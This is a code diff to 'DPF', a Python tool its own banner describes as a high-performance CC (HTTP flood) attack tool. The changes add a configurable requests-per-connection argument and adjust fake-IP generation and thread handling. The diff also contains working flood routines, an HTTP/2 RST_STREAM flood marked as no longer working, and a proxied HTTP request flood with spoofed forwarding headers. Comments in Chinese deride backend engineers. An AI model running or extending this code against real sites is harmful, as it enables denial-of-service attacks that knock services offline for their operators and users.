@@ -204,7 +204,7 @@ def GetReferer():
 def fakeIP(): #假IP 專幹那些低能後端工程師
     ip = ""
     for _ in range(4):
-        ip += f".{random.randint(0,254)}"
+        ip += f".{random.randint(1,254)}"
         # 別懷疑 就是會有低能白癡後端 覺得後台看到的IP會是真的 
         # 這邊觀念宣導, 資料庫抓到的ip 不管從哪個標頭抓的 全部都是可以偽造的
         # X-forwarded-For, Client-IP, Via 等等 數不清的標頭 IP全部都可以偽造
@@ -349,18 +349,6 @@ DPF is a high performance CC attack tool, Code By GogoZin
 """)
 
 
-def joinThreads():
-    time.sleep(1)
-    while 1:
-        if len(th_list) > 0:
-            for th in th_list:
-                try:
-                    th.join()
-                except AttributeError:
-                    pass
-        time.sleep(5)
-
-
 def launchThreads():
     for _ in range(thr):
         try:
@@ -369,7 +357,6 @@ def launchThreads():
             else:
                 t = threading.Thread(target=send_rst)
             t.start()
-            th_list.append(t)
         except:
             pass
 
@@ -398,7 +385,7 @@ def send_rst(): #Send http2 requests with rst_stream (已失效)
                 s.sendall(conn.data_to_send())
                 try:
                     sid_lst = []
-                    for _ in range(100):
+                    for _ in range(rpc):
                         p = path + "?" + rC(rand) + "=" + str(rInt(1,65535))
                         sid = 1 + 2 * _
                         sid_lst.append(sid)
@@ -447,7 +434,7 @@ def send_requests(): #傳統HTTP FLOOD
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=host)
             try:
-                for _ in range(400):
+                for _ in range(rpc):
                     s.send(f"{method} {path}?{rC(rand)}{rC(rand)}={rInt(1,123456789)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
                 print(f"[DPF]->stress \033[36m{host}\033[0m from: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
                 # s.close()
@@ -459,9 +446,9 @@ def send_requests(): #傳統HTTP FLOOD
 
 
 if __name__ == '__main__':
-    if len(sys.argv) < 7:
+    if len(sys.argv) < 8:
         banner()
-        print("Usage : DPF.py <GET/POST/HEAD> <host> <port> <threads> <path> <http/http2>")
+        print("Usage : DPF.py <GET/POST/HEAD> <host> <port> <threads> <rpc> <path> <http/http2>")
         print(" --fetch  | For fetch proxies auto")
         sys.exit()
     else:
@@ -488,7 +475,8 @@ if __name__ == '__main__':
                 thr = thr
             sema = threading.Semaphore(thr)
             path = str(sys.argv[5])
-            version = str(sys.argv[6])
+            rpc = int(sys.argv[6])
+            version = str(sys.argv[7])
         except Exception as e:
             print(f"Argv Error : {e}")
             sys.exit()
